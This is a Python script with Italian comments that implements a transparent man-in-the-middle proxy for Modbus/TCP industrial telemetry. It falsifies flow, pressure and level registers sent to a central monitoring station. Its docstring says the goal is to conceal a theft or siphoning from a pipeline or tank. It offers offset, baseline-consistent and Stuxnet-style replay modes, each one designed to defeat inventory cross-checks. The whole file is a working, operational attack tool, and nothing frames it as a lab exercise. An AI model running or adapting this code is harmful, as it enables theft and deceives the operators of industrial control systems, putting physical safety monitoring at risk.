#!/usr/bin/env python3
"""
MITM Modbus/TCP — relay trasparente che FALSIFICA la telemetria diretta a Centro.

Si inserisce tra la workstation di sito (server Modbus) e Centro (master) e
manipola le risposte di lettura (FC 3 / FC 4). Tre modi, crescenti per realismo:

  offset      Aggiunge +delta al solo registro di PORTATA (reg 0). Semplice, ma
              livello e pressione restano quelli reali: nel tempo il cross-check
              inventario (portata piena + serbatoio che non sale) smaschera il furto.

  consistent  Porta = reale + delta, E livello/pressione presi da una BASELINE
              nominale registrata prima del furto -> la vista resta mutuamente
              coerente (portata nominale + serbatoio che sale al ritmo giusto).
              Batte anche il cross-check inventario. (upgrade "coerenza multivariabile")

  replay      Record-and-replay stile Stuxnet: TUTTI i registri vengono sostituiti
              con una sequenza "normale" registrata prima del furto e rigiocata in
              loop. Massima furtivita': il flusso verso Centro e' telemetria reale
              di un periodo sano. (upgrade "replay")

Per consistent/replay serve una finestra di APPRENDIMENTO (--learn s): all'avvio il
proxy inoltra inalterato e registra la baseline. Avviare quindi il MITM PRIMA di
aprire lo spillamento, cosi' la baseline e' nominale.

Inserimento in-path: iptables REDIRECT (trasparente, SO_ORIGINAL_DST) o --dest.
La riscrittura preserva la lunghezza del frame (nessun rinumero TCP).

Uso:
  python3 mitm_proxy.py --listen 0.0.0.0:5503 --mode consistent --delta 60 --learn 8
"""
import argparse
import socket
import struct
import threading
import time

SO_ORIGINAL_DST = 80

# stato globale condiviso tra connessioni
BASE = []          # baseline: lista di tuple-registri [r0..r4] registrate nominali
BASE_MAX = 240     # ~2 min a 2 Hz
PTR = {"i": 0}
STATE = {"mode": "offset", "delta_reg": 0, "learn": 8.0, "t0": time.time(),
         "rw": 0, "last": None}


def masking_on():
    if STATE["mode"] == "offset":
        return True  # stateless, nessun apprendimento
    return (time.time() - STATE["t0"]) >= STATE["learn"] and len(BASE) > 0


def original_dst(sock):
    data = sock.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
    port, = struct.unpack_from("!H", data, 2)
    ip = socket.inet_ntoa(data[4:8])
    return ip, port


def transform(regs):
    """regs: lista di interi (registri letti). Ritorna la lista manipolata."""
    mode = STATE["mode"]
    out = list(regs)
    if not masking_on():
        # fase di apprendimento: registra baseline (solo se >=5 registri)
        if mode in ("consistent", "replay") and len(regs) >= 5:
            BASE.append(list(regs[:5]))
            if len(BASE) > BASE_MAX:
                BASE.pop(0)
        return out
    if mode == "offset":
        if len(out) >= 1:
            out[0] = max(0, min(65535, out[0] + STATE["delta_reg"]))
    elif mode == "consistent":
        snap = BASE[PTR["i"] % len(BASE)] if BASE else None
        PTR["i"] += 1
        if len(out) >= 1:
            out[0] = max(0, min(65535, out[0] + STATE["delta_reg"]))  # portata reale+delta (nominale)
        if snap:
            if len(out) >= 2:
                out[1] = snap[1]   # pressione nominale
            if len(out) >= 3:
                out[2] = snap[2]   # livello nominale (batte il cross-check inventario)
    elif mode == "replay":
        snap = BASE[PTR["i"] % len(BASE)] if BASE else None
        PTR["i"] += 1
        if snap:
            for i in range(min(len(out), len(snap))):
                out[i] = snap[i]   # tutta la telemetria dal periodo sano
    return out


def rewrite_responses(buf):
    out = bytearray()
    i, n = 0, len(buf)
    while n - i >= 6:
        length = struct.unpack_from("!H", buf, i + 4)[0]
        end = i + 6 + length
        if end > n:
            break
        frame = bytearray(buf[i:end])
        if length >= 3:
            func = frame[7]
            if func in (3, 4):
                bc = frame[8]
                count = bc // 2
                if count >= 1 and 9 + bc <= len(frame):
                    regs = [struct.unpack_from("!H", frame, 9 + 2 * k)[0] for k in range(count)]
                    newregs = transform(regs)
                    for k in range(count):
                        struct.pack_into("!H", frame, 9 + 2 * k, newregs[k] & 0xFFFF)
                    if masking_on() and newregs != regs:
                        STATE["rw"] += 1
                        STATE["last"] = (regs[0], newregs[0])
        out += frame
        i = end
    return bytes(out), buf[i:]


def pump_plain(src, dst):
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            dst.sendall(data)
    except Exception:
        pass
    finally:
        for s in (src, dst):
            try:
                s.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass


def pump_rewrite(src, dst):
    buf = b""
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            buf += data
            out, buf = rewrite_responses(buf)
            if out:
                dst.sendall(out)
    except Exception:
        pass
    finally:
        for s in (src, dst):
            try:
                s.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass


def handle(client, dest):
    try:
        dip, dport = dest if dest else original_dst(client)
        server = socket.create_connection((dip, dport), timeout=5)
    except Exception:
        client.close()
        return
    threading.Thread(target=pump_plain, args=(client, server), daemon=True).start()
    pump_rewrite(server, client)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--listen", default="0.0.0.0:5503")
    ap.add_argument("--dest", help="ip:porta reale (modo esplicito); altrimenti SO_ORIGINAL_DST")
    ap.add_argument("--mode", choices=["offset", "consistent", "replay"], default="offset")
    ap.add_argument("--delta", type=float, default=60.0, help="m3/h aggiunti alla portata")
    ap.add_argument("--learn", type=float, default=8.0, help="secondi di apprendimento baseline (consistent/replay)")
    args = ap.parse_args()

    lip, lport = args.listen.split(":")
    dest = None
    if args.dest:
        dh, dp = args.dest.split(":")
        dest = (dh, int(dp))
    STATE["mode"] = args.mode
    STATE["delta_reg"] = int(round(args.delta * 10))
    STATE["learn"] = args.learn
    STATE["t0"] = time.time()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((lip, int(lport)))
    srv.listen(64)
    learn_note = "" if args.mode == "offset" else f" | apprendimento {args.learn:.0f}s"
    print(f"[MITM] {args.listen} | modo={args.mode} delta=+{args.delta}{learn_note} | dest={'SO_ORIGINAL_DST' if not dest else dest}")

    def reporter():
        while True:
            time.sleep(5)
            ph = "MASCHERAMENTO" if masking_on() else "apprendimento baseline"
            print(f"[MITM] {ph} | modo={STATE['mode']} | registri falsificati={STATE['rw']} | baseline={len(BASE)} | ultimo reg0={STATE['last']}")
    threading.Thread(target=reporter, daemon=True).start()

    while True:
        client, _ = srv.accept()
        threading.Thread(target=handle, args=(client, dest), daemon=True).start()


if __name__ == "__main__":
    main()
